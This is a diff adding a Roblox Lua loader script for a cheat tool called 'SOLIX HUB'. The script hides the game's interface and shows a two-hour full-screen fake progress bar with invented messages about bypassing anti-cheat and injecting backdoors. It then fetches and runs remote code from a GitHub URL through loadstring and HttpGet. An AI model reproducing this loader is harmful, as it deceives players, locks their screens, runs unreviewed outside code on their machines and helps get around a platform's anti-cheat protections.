@@ -1,0 +1,183 @@
+local player = game.Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+
+-- ==================================================================
+-- CONFIGURATION
+-- ==================================================================
+local MAIN_WAIT_TIME = 2 * 60 * 60 -- 2 Hours (7200 seconds)
+local FAST_WAIT_TIME = 1.5 -- 1.5 seconds para sa unang GUI
+local DISCORD_LINK = "https://discord.gg/T8sksQsjmR"
+local HUB_NAME = "SOLIX HUB"
+
+local randomMessages = {
+    "Bypassing Anti-Cheat...",
+    "Waiting for server response...",
+    "Injecting backdoor access...",
+    "Decrypting hidden files...",
+    "Securing connection...",
+    "Scanning vulnerabilities...",
+    "Downloading Solix modules...",
+    "Disabling Roblox security..."
+}
+
+-- Patayin ang default Roblox UI (Chat, Leaderboard, etc.)
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+-- Function para gumawa ng Full Screen na Base
+local function createFullScreenBase(name, order)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = name
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true -- Sinasakop ang buong screen (pati notch sa mobile)
+    gui.DisplayOrder = order -- Pinakamataas para laging nasa ibabaw
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(5, 0, 0) -- Pitch black/dark red
+    bg.BorderSizePixel = 0
+    bg.Parent = gui
+
+    return gui, bg
+end
+
+-- ==================================================================
+-- 1. FAST GUI (Mauunang mag-execute, 1 second lang)
+-- ==================================================================
+local fastGui, fastBg = createFullScreenBase("FastInjectorGUI", 999999998)
+
+local fastText = Instance.new("TextLabel")
+fastText.Size = UDim2.new(0.8, 0, 0.1, 0)
+fastText.AnchorPoint = Vector2.new(0.5, 0.5)
+fastText.Position = UDim2.new(0.5, 0, 0.45, 0)
+fastText.BackgroundTransparency = 1
+fastText.Text = "Preparing Solix Environment..."
+fastText.TextColor3 = Color3.fromRGB(200, 200, 200)
+fastText.Font = Enum.Font.GothamSemibold
+fastText.TextScaled = true
+fastText.Parent = fastBg
+
+local fastBarBg = Instance.new("Frame")
+fastBarBg.Size = UDim2.new(0.6, 0, 0, 6)
+fastBarBg.AnchorPoint = Vector2.new(0.5, 0.5)
+fastBarBg.Position = UDim2.new(0.5, 0, 0.55, 0)
+fastBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+fastBarBg.BorderSizePixel = 0
+fastBarBg.Parent = fastBg
+
+local fastBarFill = Instance.new("Frame")
+fastBarFill.Size = UDim2.new(0, 0, 1, 0)
+fastBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+fastBarFill.BorderSizePixel = 0
+fastBarFill.Parent = fastBarBg
+
+-- ==================================================================
+-- 2. MAIN SOLIX GUI (Tatapalan ang unang GUI, 2 Hours)
+-- ==================================================================
+local mainGui, mainBg = createFullScreenBase("SolixMainLoader", 999999999)
+mainGui.Enabled = false -- Nakatago muna habang nag-rrun yung Fast GUI
+
+local container = Instance.new("Frame")
+container.AnchorPoint = Vector2.new(0.5, 0.5)
+container.Position = UDim2.new(0.5, 0, 0.5, 0)
+container.Size = UDim2.new(0.9, 0, 0.5, 0) -- Mobile fitted
+container.BackgroundTransparency = 1
+container.Parent = mainBg
+
+local layout = Instance.new("UIListLayout")
+layout.Parent = container
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.VerticalAlignment = Enum.VerticalAlignment.Center
+layout.Padding = UDim.new(0, 20)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.Text = HUB_NAME
+title.TextColor3 = Color3.fromRGB(255, 0, 0)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.Parent = container
+
+local titleStroke = Instance.new("UIStroke")
+titleStroke.Color = Color3.fromRGB(80, 0, 0)
+titleStroke.Thickness = 2
+titleStroke.Parent = title
+
+local mainBarBg = Instance.new("Frame")
+mainBarBg.Size = UDim2.new(0.9, 0, 0, 10)
+mainBarBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+mainBarBg.BorderSizePixel = 0
+mainBarBg.Parent = container
+Instance.new("UICorner", mainBarBg).CornerRadius = UDim.new(1, 0)
+
+local mainBarFill = Instance.new("Frame")
+mainBarFill.Size = UDim2.new(0, 0, 1, 0)
+mainBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+mainBarFill.BorderSizePixel = 0
+mainBarFill.Parent = mainBarBg
+Instance.new("UICorner", mainBarFill).CornerRadius = UDim.new(1, 0)
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(1, 0, 0.15, 0)
+statusText.BackgroundTransparency = 1
+statusText.Text = "Initializing..."
+statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusText.Font = Enum.Font.GothamSemibold
+statusText.TextScaled = true
+statusText.Parent = container
+
+local discordLabel = Instance.new("TextLabel")
+discordLabel.Size = UDim2.new(1, 0, 0.1, 0)
+discordLabel.BackgroundTransparency = 1
+discordLabel.Text = "Discord: " .. DISCORD_LINK
+discordLabel.TextColor3 = Color3.fromRGB(180, 50, 50)
+discordLabel.Font = Enum.Font.Gotham
+discordLabel.TextScaled = true
+discordLabel.Parent = container
+
+-- ==================================================================
+-- 3. EXECUTION LOGIC (SEQUENCE)
+-- ==================================================================
+task.spawn(function()
+    -- PHASE 1: Patakbuhin ang Fast GUI (1.5 seconds)
+    TweenService:Create(fastBarFill, TweenInfo.new(FAST_WAIT_TIME, Enum.EasingStyle.Sine), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    task.wait(FAST_WAIT_TIME)
+    
+    -- PHASE 2: Ipakita ang Main Solix GUI tapos burahin ang Fast GUI
+    mainGui.Enabled = true
+    fastGui:Destroy()
+    
+    -- PHASE 3: Simulan ang 2-Hour Loading Timer
+    local startTime = tick()
+    local endTime = startTime + MAIN_WAIT_TIME
+    
+    TweenService:Create(mainBarFill, TweenInfo.new(MAIN_WAIT_TIME, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    
+    while tick() < endTime do
+        local elapsed = tick() - startTime
+        local percentage = math.clamp(math.floor((elapsed / MAIN_WAIT_TIME) * 100), 0, 99)
+        
+        local chosenMessage = randomMessages[math.random(1, #randomMessages)]
+        statusText.Text = chosenMessage .. " [" .. percentage .. "%]"
+        
+        task.wait(math.random(3, 6)) -- Random interval ng text
+    end
+    
+    -- PHASE 4: Tapos na ang 2 hours
+    statusText.Text = "Injection Complete! [100%]"
+    mainBarFill.Size = UDim2.new(1, 0, 1, 0)
+    task.wait(2)
+    
+    -- Ibalik ang normal na screen ng Roblox
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+    end)
+    mainGui:Destroy()
+    
+    -- I-execute ang totoong Hub
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/habibbib01/Solix.Hub.ETFB/refs/heads/main/loader.lua'))()
+end)
